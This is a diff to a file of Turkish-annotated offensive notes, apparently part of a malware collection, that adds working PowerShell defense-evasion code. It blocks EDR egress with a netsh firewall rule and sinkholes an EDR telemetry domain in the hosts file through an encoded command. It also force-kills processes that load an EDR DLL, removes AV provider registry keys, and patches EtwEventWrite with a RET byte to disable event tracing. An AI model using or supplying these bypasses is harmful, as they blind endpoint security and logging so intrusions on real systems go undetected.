@@ -412,9 +412,12 @@ Malware 7 (Process and Thread Injection in C)
 avbypass = r'''
 EDR bypass:
 🔥 Alternatif: PowerShell ile netsh Kullanarak IP Bazlı Egress Engelleme
-$ip = "198.51.100.45"; $rule = "block_edr"; Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs
 
--------------------------------------
+$ip = "198.51.100.45" # EDR sunucu IP’si (örnek IP - değiştirmelisin)
+$rule = "block_edr"
+
+Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs
+
 🎭 Daha Gizli Versiyon (Script Block Logging vs Bypass için encoded payload):
 
 $cmd = 'Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1`ttele.edr.cloud"'
@@ -425,7 +428,20 @@ powershell -EncodedCommand $enc
 🛡️ 3. EDR DLL Load'larını Etkin Süreçte İzleme ve Kapatma (Sysmon / Event 7 Gibi)
 
 EDR’ye ait DLL’lerin hangi süreçlere yüklendiğini görüp, PowerShell ile dinamik olarak bunları suspend veya unload etmeye çalışmak:
-$edrDll = "edrhook.dll"; Get-Process | ForEach-Object { try { $modules = $_.Modules; foreach ($mod in $modules) { if ($mod.ModuleName -like "*$edrDll*") { Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"; Stop-Process -Id $_.Id -Force } } } catch { Write-Host "[!] Hata: $($_.Exception.Message)" } }
+
+$edrDll = "edrhook.dll"
+Get-Process | ForEach-Object {
+    try {
+        $modules = $_.Modules
+        foreach ($mod in $modules) {
+            if ($mod.ModuleName -like "*$edrDll*") {
+                Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"
+                Stop-Process -Id $_.Id -Force
+            }
+        }
+    } catch {}
+}
+
 
 🧨 2. Advanced API-based Suspend (Low-Level Native)
 
@@ -487,6 +503,47 @@ Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\" | ForEach-
         Remove-Item $_.PSPath -Force
     }
 }
+
+
+ETW Patch (RET Injection):
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Native {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+# Sabitler
+$PAGE_EXECUTE_READWRITE = 0x40
+$patch = [byte[]](0xC3)  # RET instruction
+
+# ntdll.dll modülünü al
+$ntdll = [Native]::GetModuleHandle("ntdll.dll")
+
+# EtwEventWrite adresini al
+$etw = [Native]::GetProcAddress($ntdll, "EtwEventWrite")
+
+# Bellek korumasını değiştir
+$oldProtect = 0
+[Native]::VirtualProtect($etw, [UIntPtr]1, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null
+
+# Patch uygula (0xC3 = RET)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, 1)
+
+# Eski korumayı geri yükle
+[Native]::VirtualProtect($etw, [UIntPtr]1, $oldProtect, [ref]$null) | Out-Null
+
+Write-Host "[+] EtwEventWrite patched successfully."
+
 
 Amsi bypass:
 registry ile:
